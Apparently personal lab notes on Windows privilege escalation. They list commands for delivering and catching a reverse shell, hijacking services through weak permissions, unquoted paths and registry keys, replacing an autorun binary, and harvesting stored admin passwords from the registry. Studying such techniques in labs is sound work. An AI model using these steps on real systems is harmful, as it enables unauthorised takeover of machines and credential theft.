## Windows PrivEsc

# 1- Generate a Reverse Shell Executable:

    - generate metasploit payload
    - host the payload so you can download it <sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py $USER .>
    - copy it to target machine <copy \\$VPN_IP\$USER\reverse.exe C:\PrivEsc\$PAYLOAD.exe>
    - listen for connections <sudo nc -nvlp 53>
    - run the payload <path\to\payload.exe>

---

# 2- Service Exploits - Insecure Service Permissions $SERVICE_NAME=daclsvc :

    - <C:\PrivEsc\accesschk.exe /accepteula -uwcqv $USER $SERVICE_NAME>:
    	accesschk.exe -> allows you to view permissions of files
    	/accepteula   -> allows you to specify the user without asking for confermation
    	-u   -> for selecting the user
    	-w   -> for getting objects that users can write
    	-c   -> for getting objects that users can change
    	-q   -> for getting objects that users can see the output
    	-v   -> what kind of access the user has for that object

    - query service configs <sc qc daclsvc>
    - change the BINARY_PATH_NAME to payload path <sc config $SERVICE binpath= "\"path\to\payload.exe\"">
    - start another netcat listener <sudo nc -nlvp 53>
    - start the service from cmd which will runs as root <sc start daclsvc>

---

# 3- Service Exploits - Unquoted Service Path $SERVICE_NAME=unquotedsvc:

    - get the binary path of the service <sc qc unquotedsvc>
    - "RW BUILTIN\Users" which means the user can read and write in this directory
    - copy the payload to the service folder and update his name where it can runs by the sys <copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe">
    - start the service <net start unquotedsvc>

---

# 4- Service Exploits - Weak Registry Permissions $SERVICE_NAME=regsvc:

    - NOTE: Regestry contains paths for configuration of the hardware and software
    - get the path of the service <sc qc regsvc>
    - get the permissions of the service <C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc>
    - Here there is NT AUTHORITY\INTERACTIVE which means all the logged users has the access to all keys
    - so we need to add new regestry who have the path to reverse shell script <reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f>
    -start the service <net start regvc>

---

# 5- Service Exploits - Insecure Service Executables $SERVICE_NAME=filepermsvc:

    - query the serivce path <sc qc filepermsvc>
    - check the permissions of that file <C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe">
    - we get {RW Everyone \ FILE_ALL_ACCESS} which means every one can read and right to this file
    - copy the payload <copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y>
    - start the service <net start filepermsvc>

---

# 6- Registry - AutoRuns:

    - query the programe path <reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run>
    - after using the followig command <C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"> we get {RW Everyone \ FILE_ALL_ACCESS} so everyone can read and write to this file
    - repplace the program.exe with the pyload <copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y>
    - well this time we use <rdesktop $MACHINE_IP> bcz we replaced the payload with program that automatically run

# 7- Registry - AlwaysInstallElevated

    here we will query the value "AlwaysInstallElevated" from registry key "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" which will check if normal user to install programs to admin level
    <reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated>
    the return of this command is (AlwaysInstallElevated  REG_DWORD    0x1) 0x1 means 1 so yes normal can user can install programs to admin level

# 8- Passwords - Registry

    in this task we will search for the password in the regestry key usign this command <reg query HKLM /f password /t REG_SZ /s>

    /f means find or search for password
    /t means the type of data
    /s means search the entire registry

    <reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"> this command will find the admin autologon password that was stored in reg key

    after finding the password use the following command to get cmd as an admin <winexe -U 'admin%password' //10.10.85.31 cmd.exe>
